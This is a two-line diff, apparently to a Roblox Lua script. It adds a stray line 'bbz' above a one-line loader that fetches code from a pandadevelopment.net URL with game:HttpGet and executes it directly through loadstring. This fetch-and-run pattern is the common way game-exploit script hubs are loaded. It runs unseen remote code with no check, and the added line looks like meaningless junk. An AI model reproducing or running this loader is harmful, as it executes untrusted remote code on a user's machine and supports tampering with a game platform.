@@ -1,1 +1,2 @@
+bbz
 loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/f9119bc27174ebd6"))()
